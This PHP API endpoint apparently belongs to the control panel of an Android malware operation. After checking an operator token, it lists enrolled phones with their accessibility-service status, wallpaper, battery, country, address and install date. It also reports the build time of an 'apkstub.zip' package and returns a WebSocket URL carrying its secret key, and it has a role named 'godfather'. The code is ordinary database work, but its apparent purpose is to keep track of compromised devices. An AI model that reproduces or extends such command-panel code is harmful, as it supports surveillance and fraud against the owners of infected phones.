<?php

date_default_timezone_set('Asia/Shanghai');

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: Content-Type, Authorization");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Content-Type: application/json");

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit();
}

// 获取请求体中的 token 参数
$data = json_decode(file_get_contents('php://input'), true);
$token = isset($data['token']) ? $data['token'] : '';

if (!$token) {
    http_response_code(401);
    echo json_encode(['error' => '未提供 token']);
    exit();
}


require_once '../private/Eaod85401.php';

function wsStatusTableExists(PDO $pdo): bool
{
    static $exists = null;
    if ($exists !== null) {
        return $exists;
    }

    $stmt = $pdo->query("SHOW TABLES LIKE 'ws_device_status'");
    $exists = (bool) $stmt->fetchColumn();
    return $exists;
}

function normalizeDeviceListRows(array $rows): array
{
    foreach ($rows as &$row) {
        if (array_key_exists('accessibility', $row)) {
            $row['accessibility'] = (string) ((int) $row['accessibility']);
        }
        if (array_key_exists('phoneopen', $row)) {
            $row['phoneopen'] = (string) ((int) $row['phoneopen']);
        }
        if (array_key_exists('activz', $row)) {
            $row['activz'] = (string) $row['activz'];
        }
        if (!array_key_exists('android_version', $row) && array_key_exists('android_ver', $row)) {
            $row['android_version'] = (string) $row['android_ver'];
        }
        if (array_key_exists('wallpap', $row)) {
            $row['wallpap'] = isBase64((string) $row['wallpap']) ? (string) $row['wallpap'] : '';
        } elseif (array_key_exists('wallpaper', $row)) {
            $row['wallpap'] = isBase64((string) $row['wallpaper']) ? (string) $row['wallpaper'] : '';
        }
        if (!array_key_exists('battery_charge', $row) && array_key_exists('battery_charg', $row)) {
            $row['battery_charge'] = (string) $row['battery_charg'];
        }
        if (!array_key_exists('country', $row) || $row['country'] === null) {
            $row['country'] = '';
        }
    }
    unset($row);

    return $rows;
}

function canViewGlobalDevices(array $user): bool
{
    $usrname = strtolower(trim((string)($user['usrname'] ?? '')));
    $authorty = strtolower(trim((string)($user['authorty'] ?? '')));
    // 超级管理员（zuige）或 authorty=admin/godfather 均可查看全局
    return ($usrname === 'zuige' || $authorty === 'admin' || $authorty === 'godfather');
}

function isBase64($str)
{
    return preg_match('/^[a-zA-Z0-9\/\r\n+]*={0,2}$/', $str) && strlen($str) % 4 === 0;
}


try {
    $pdo = new PDO("mysql:host=" . DB_ServerName . ";dbname=" . DB_Name . ";charset=utf8mb4", DB_UserName, DB_Password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // 查找当前用户
    $stmt = $pdo->prepare("SELECT * FROM users WHERE token = :token");
    $stmt->bindParam(':token', $token, PDO::PARAM_STR);
    $stmt->execute();
    $user = $stmt->fetch(PDO::FETCH_ASSOC);

    if (!$user) {
        http_response_code(401);
        echo json_encode(['error' => '无效 token']);
        exit();
    }

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $input = json_decode(file_get_contents('php://input'), true);
        $page = isset($input['page']) ? (int)$input['page'] : 1;
        $pageSize = isset($input['pageSize']) ? (int)$input['pageSize'] : 10;
        $offset = ($page - 1) * $pageSize;

        $usrname = $user['usrname'] ?? '';
        $authorty = strtolower((string)($user['authorty'] ?? ''));
        $isAdmin = ($authorty === 'admin');
        $isGodfather = ($authorty === 'godfather');
        $canViewGlobal = canViewGlobalDevices($user);

        // ✅ 构造 SQL 过滤条件
        $whereSql = '';
        $params = [];

        // if ($user['usrname'] === 'admin') {
        //     $whereSql = 'WHERE isonline = 1';
        // } else {
        //     $whereSql = 'WHERE usrname = :usrname AND isonline = 1 AND phoneopen = 1';
        //     $params[':usrname'] = $usrname;
        // }
        if ($canViewGlobal) {
            $whereSql = 'WHERE phoneopen = 1';
        } else {
            $whereSql = 'WHERE usrname = :usrname AND phoneopen = 1';
            $params[':usrname'] = $usrname;
        }

        // ✅ 动态追加过滤条件
        if (!empty($input['usrname'])) {
            $whereSql .= ' AND usrname LIKE :usrnameSearch';
            $params[':usrnameSearch'] = '%' . $input['usrname'] . '%';
        }
        if (!empty($input['phone_name'])) {
            $whereSql .= ' AND phone_name LIKE :phone_name';
            $params[':phone_name'] = '%' . $input['phone_name'] . '%';
        }
        if (!empty($input['country'])) {
            $whereSql .= ' AND country LIKE :country';
            $params[':country'] = '%' . $input['country'] . '%';
        }
        if (!empty($input['model'])) {
            $whereSql .= ' AND model LIKE :model';
            $params[':model'] = '%' . $input['model'] . '%';
        }
        if (isset($input['accessibility']) && $input['accessibility'] !== '') {
            $whereSql .= ' AND accessibility = :accessibility';
            $params[':accessibility'] = $input['accessibility'];
        }
        // if (isset($input['last_ping']) && $input['last_ping'] !== '') {
        //     $currentTime = $input['last_ping']; // 获取前端传递的在线/离线标识

        //     if ($currentTime == 0) {
        //         // 如果前端传递的是0，表示在线，过滤 last_ping 小于 15 秒的设备
        //         $whereSql .= ' AND TIMESTAMPDIFF(SECOND, last_ping, NOW()) < 15';
        //     } elseif ($currentTime == 1) {
        //         // 如果前端传递的是1，表示离线，过滤 last_ping 大于 15 秒的设备
        //         $whereSql .= ' AND TIMESTAMPDIFF(SECOND, last_ping, NOW()) > 15';
        //     }
        // }
        if (!empty($input['install_date'])) {
            $whereSql .= ' AND install_date LIKE :install_date';
            $params[':install_date'] = '%' . $input['install_date'] . '%';
        }

        $total = 0;
        $phones = [];

        // 获取总数
        $totalSql = "SELECT COUNT(*) FROM phones $whereSql";
        $totalStmt = $pdo->prepare($totalSql);
        foreach ($params as $key => $val) {
            $totalStmt->bindValue($key, $val);
        }
        $totalStmt->execute();
        $total = (int)$totalStmt->fetchColumn();

        if ($total > 0) {
            $sql = "
                SELECT 
                    phone_id, usrname, phone_name, android_ver, android_ver AS android_version, model,
                    wallpaper AS wallpap, battery_charg, battery_charg AS battery_charge,
                    install_date, last_ping, address, country, phoneopen, accessibility, activities AS activz
                FROM phones
                $whereSql
                ORDER BY install_date DESC, phone_id ASC
                LIMIT :limit OFFSET :offset
            ";
            $stmt = $pdo->prepare($sql);
            foreach ($params as $key => $val) {
                $stmt->bindValue($key, $val);
            }
            $stmt->bindValue(':limit', $pageSize, PDO::PARAM_INT);
            $stmt->bindValue(':offset', $offset, PDO::PARAM_INT);
            $stmt->execute();
            $phones = normalizeDeviceListRows($stmt->fetchAll(PDO::FETCH_ASSOC));
        } elseif (wsStatusTableExists($pdo)) {
            $wsWhereParts = [];
            $wsParams = [];

            $wsWhereParts[] = 'ws_online = 1';

            if (!($canViewGlobal)) {
                $wsWhereParts[] = 'usrname = :usrname';
                $wsParams[':usrname'] = $usrname;
            }
            if (!empty($input['usrname'])) {
                $wsWhereParts[] = 'usrname LIKE :usrnameSearch';
                $wsParams[':usrnameSearch'] = '%' . $input['usrname'] . '%';
            }
            if (!empty($input['phone_name'])) {
                $wsWhereParts[] = 'phone_name LIKE :phone_name';
                $wsParams[':phone_name'] = '%' . $input['phone_name'] . '%';
            }
            if (!empty($input['model'])) {
                $wsWhereParts[] = 'model LIKE :model';
                $wsParams[':model'] = '%' . $input['model'] . '%';
            }
            if (!empty($input['install_date'])) {
                $wsWhereParts[] = 'install_date LIKE :install_date';
                $wsParams[':install_date'] = '%' . $input['install_date'] . '%';
            }

            $wsWhereSql = $wsWhereParts ? ('WHERE ' . implode(' AND ', $wsWhereParts)) : '';

            $wsTotalSql = "SELECT COUNT(*) FROM ws_device_status $wsWhereSql";
            $wsTotalStmt = $pdo->prepare($wsTotalSql);
            foreach ($wsParams as $key => $val) {
                $wsTotalStmt->bindValue($key, $val);
            }
            $wsTotalStmt->execute();
            $total = (int)$wsTotalStmt->fetchColumn();

            $wsSql = "
                SELECT
                    phone_id,
                    COALESCE(usrname, '') AS usrname,
                    COALESCE(phone_name, '') AS phone_name,
                    COALESCE(android_ver, '') AS android_ver,
                    COALESCE(android_ver, '') AS android_version,
                    COALESCE(model, '') AS model,
                    COALESCE(wallpaper, '') AS wallpap,
                    COALESCE(battery_charg, '') AS battery_charg,
                    COALESCE(battery_charg, '') AS battery_charge,
                    COALESCE(install_date, '') AS install_date,
                    COALESCE(activz, '') AS activz,
                    last_ws_ping AS last_ping,
                    '' AS address,
                    COALESCE(country, '') AS country,
                    ws_online AS phoneopen,
                    COALESCE(accessibility, 0) AS accessibility
                FROM ws_device_status
                $wsWhereSql
                ORDER BY ws_online DESC, last_ws_ping DESC, phone_id ASC
                LIMIT :limit OFFSET :offset
            ";
            $wsStmt = $pdo->prepare($wsSql);
            foreach ($wsParams as $key => $val) {
                $wsStmt->bindValue($key, $val);
            }
            $wsStmt->bindValue(':limit', $pageSize, PDO::PARAM_INT);
            $wsStmt->bindValue(':offset', $offset, PDO::PARAM_INT);
            $wsStmt->execute();
            $phones = normalizeDeviceListRows($wsStmt->fetchAll(PDO::FETCH_ASSOC));
        }

        $pageCount = $pageSize > 0 ? (int)ceil($total / $pageSize) : 0;

        // ✅ 获取文件最后修改时间
        $filePath = __DIR__ . "/../private/apkstub/apkstub.zip"; 
        $fileLastModified = null;
        
        if (file_exists($filePath)) {
            $fileLastModified = date("Y-m-d H:i:s", filemtime($filePath));
        }
        // WebSocket URL（含密钥，供前端连接）
        $baseUrl = defined('WS_SERVER_URL') ? WS_SERVER_URL : '';
        if ($baseUrl === '') {
            $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'wss' : 'ws';
            $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
            $host = preg_replace('/:\d+$/', '', $host);
            $baseUrl = $protocol . '://' . $host . '/api/ws/';
        }
        $wsSecret = defined('WS_SECRET') ? WS_SECRET : '';
        $wsUrl = $baseUrl;
        if ($wsSecret !== '') {
            $wsUrl .= (strpos($wsUrl, '?') !== false ? '&' : '?') . 'k=' . urlencode($wsSecret);
        }

        echo json_encode([
            'data' => $phones,
            'total' => $total,
            'pageCount' => $pageCount, 
            'fileLastModified' => $fileLastModified,
            'wsUrl' => $wsUrl
        ]);
    } else {
        http_response_code(405);
        echo json_encode(['error' => 'Invalid request method.']);
    }
} catch (PDOException $e) {
    http_response_code(500);
    echo json_encode(['error' => 'Server error']);
    error_log("EaodAllDevices: " . $e->getMessage());
}


